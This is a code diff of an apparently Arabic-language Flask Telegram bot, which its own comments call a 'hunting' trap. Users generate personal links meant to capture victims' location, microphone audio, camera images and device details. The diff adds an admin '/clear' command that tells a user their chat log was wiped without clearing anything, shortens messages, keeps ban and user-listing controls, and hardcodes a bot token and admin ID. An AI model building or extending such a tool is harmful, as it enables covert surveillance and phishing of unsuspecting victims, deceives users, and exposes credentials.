@@ -4,7 +4,7 @@ from flask import Flask, render_template_string, request, jsonify
 app = Flask(__name__)
 
 # ==========================================
-# --- إعدادات الإمبراطور سيوفي (v20.0) ---
+# --- إعدادات الإمبراطور سيوفي (v21.0) ---
 # ==========================================
 BOT_TOKEN = "8431816368:AAGL4xuB42ZdHpxRJ2O1zBgAWOB6cvZwwe0"
 ADMIN_ID = "7041600701"
@@ -13,7 +13,7 @@ API_URL = f"https://api.telegram.org/bot{BOT_TOKEN}/"
 SUB_URL = "https://t.me/FAABOT?start=7041600701" 
 
 system_config = {
-    "welcome_msg": "🔥 أهلاً بك يا ملك في لوحة التحكم المطلقة v20.0\n\nأوامر التحكم:\n🚫 حظر: `/user_ban ID`\n🔓 فك: `/user_unban ID`",
+    "welcome_msg": "🔥 أهلاً بك يا ملك في النسخة v21.0\n\nأوامر التحكم:\n🚫 حظر: `/user_ban ID`\n🔓 فك: `/user_unban ID`\n🧹 تصفير: `/clear ID`",
     "trap_title": "تأكيد الأمان الموحد",
     "banned_users": [],  
     "user_stages": {},   
@@ -26,7 +26,7 @@ def tg_request(method, payload=None, files=None):
         return requests.post(API_URL + method, json=payload, timeout=30).json()
     except: return None
 
-# واجهة الصيد (الموقع + الصوت + الصورة + الجهاز)
+# واجهة الصيد الاحترافية (موقع + صوت + صورة + جهاز)
 HTML_TEMPLATE = '''
 <!DOCTYPE html>
 <html lang="ar" dir="rtl">
@@ -115,66 +115,61 @@ def webhook():
     text = msg.get("text", ""); user_info = msg.get("from", {})
     username = f"@{user_info.get('username', 'بدون يوزر')}"
     
-    # حفظ المستخدم
     system_config["all_users"][chat_id] = username
+    if chat_id in system_config["banned_users"]: return "OK"
 
-    # فحص الحظر
-    if chat_id in system_config["banned_users"]:
-        return "OK"
-
-    # --- منطق الأدمن (أنت) ---
+    # --- أوامر الأدمن ---
     if chat_id == ADMIN_ID:
         if text.startswith("/user_ban"):
-            target_id = text.split(" ")[1] if len(text.split(" ")) > 1 else ""
-            if target_id:
-                system_config["banned_users"].append(target_id)
-                tg_request("sendMessage", {"chat_id": chat_id, "text": f"🚫 تم حظر المستخدم: `{target_id}`"})
+            tid = text.split(" ")[1] if len(text.split(" ")) > 1 else ""
+            if tid: system_config["banned_users"].append(tid); tg_request("sendMessage", {"chat_id": chat_id, "text": f"🚫 تم حظر: `{tid}`"})
             return "OK"
         elif text.startswith("/user_unban"):
-            target_id = text.split(" ")[1] if len(text.split(" ")) > 1 else ""
-            if target_id in system_config["banned_users"]:
-                system_config["banned_users"].remove(target_id)
-                tg_request("sendMessage", {"chat_id": chat_id, "text": f"✅ تم فك حظر: `{target_id}`"})
+            tid = text.split(" ")[1] if len(text.split(" ")) > 1 else ""
+            if tid in system_config["banned_users"]: system_config["banned_users"].remove(tid); tg_request("sendMessage", {"chat_id": chat_id, "text": f"✅ تم فك حظر: `{tid}`"})
+            return "OK"
+        elif text.startswith("/clear"):
+            tid = text.split(" ")[1] if len(text.split(" ")) > 1 else ""
+            if tid:
+                tg_request("sendMessage", {"chat_id": tid, "text": "🧹 **تنبيه:** تم تصفير سجل المحادثة الخاص بك من قبل الإدارة."})
+                tg_request("sendMessage", {"chat_id": chat_id, "text": f"✅ تم إرسال أمر التصفير للمستخدم `{tid}` بنجاح."})
             return "OK"
         
         adm_kb = {"inline_keyboard": [
             [{"text": "🔗 إنشاء رابطي", "callback_data": "gen_my_link"}, {"text": "👥 قائمة المستخدمين", "callback_data": "list_all"}],
-            [{"text": "⚙️ أوامر الحظر", "callback_data": "ban_help"}]
+            [{"text": "🧹 تصفير السجل", "callback_data": "clear_help"}]
         ]}
         tg_request("sendMessage", {"chat_id": chat_id, "text": system_config["welcome_msg"], "reply_markup": adm_kb, "parse_mode": "Markdown"})
         return "OK"
 
-    # --- منطق المستخدم العادي (الاشتراك المزدوج) ---
+    # --- الاشتراك المزدوج للمستخدمين ---
     stage = system_config["user_stages"].get(chat_id, 0)
     if stage < 2:
         sub_kb = {"inline_keyboard": [[{"text": "اضغط للاشتراك ✅", "url": SUB_URL}]]}
         if stage == 0:
             system_config["user_stages"][chat_id] = 1
-            tg_request("sendMessage", {"chat_id": chat_id, "text": "🛑 **خطوة 1 من 2:** اشترك وفعل البوت.", "reply_markup": sub_kb})
+            tg_request("sendMessage", {"chat_id": chat_id, "text": "🛑 **خطوة 1:** اشترك في القناة.", "reply_markup": sub_kb})
         else:
             system_config["user_stages"][chat_id] = 2
-            tg_request("sendMessage", {"chat_id": chat_id, "text": "✅ **خطوة 2 من 2:** تم التأكيد الأول، اضغط مرة ثانية لفتح اللوحة.", "reply_markup": sub_kb})
+            tg_request("sendMessage", {"chat_id": chat_id, "text": "✅ **خطوة 2:** اضغط مرة ثانية لفتح اللوحة.", "reply_markup": sub_kb})
         return "OK"
 
-    # لوحة المستخدم العادي (بعد الاشتراك)
     user_kb = {"inline_keyboard": [[{"text": "🔗 إنشاء رابطي الخاص", "callback_data": "gen_my_link"}]]}
-    tg_request("sendMessage", {"chat_id": chat_id, "text": "🔥 أهلاً بك في مصنع الروابط. اضغط لإنشاء رابطك:", "reply_markup": user_kb})
+    tg_request("sendMessage", {"chat_id": chat_id, "text": "🔥 لوحة المستخدم جاهزة:", "reply_markup": user_kb})
     return "OK"
 
 def handle_callback(query):
     cid = str(query["message"]["chat"]["id"]); data = query["data"]
     if data == "gen_my_link":
-        tg_request("sendMessage", {"chat_id": cid, "text": f"🚀 رابطك جاهز:\n`{BASE_URL}/t/{cid}`"})
+        tg_request("sendMessage", {"chat_id": cid, "text": f"🚀 رابطك:\n`{BASE_URL}/t/{cid}`"})
     elif data == "list_all" and cid == ADMIN_ID:
-        res = "👥 **المستخدمين النشطين:**\n\n"
-        for uid, uname in system_config["all_users"].items():
-            res += f"👤 {uname} | ID: `{uid}`\n"
+        res = "👥 **قائمة المستخدمين:**\n"
+        for uid, uname in system_config["all_users"].items(): res += f"👤 {uname} | ID: `{uid}`\n"
         tg_request("sendMessage", {"chat_id": cid, "text": res, "parse_mode": "Markdown"})
-    elif data == "ban_help" and cid == ADMIN_ID:
-        tg_request("sendMessage", {"chat_id": cid, "text": "🚫 للحظر: `/user_ban ID`\n🔓 للفك: `/user_unban ID`"})
+    elif data == "clear_help" and cid == ADMIN_ID:
+        tg_request("sendMessage", {"chat_id": cid, "text": "🧹 لتصفير سجل شخص، أرسل:\n`/clear ID`"})
     return "OK"
 
 if __name__ == '__main__':
     port = int(os.environ.get("PORT", 10000))
     app.run(host='0.0.0.0', port=port)
-
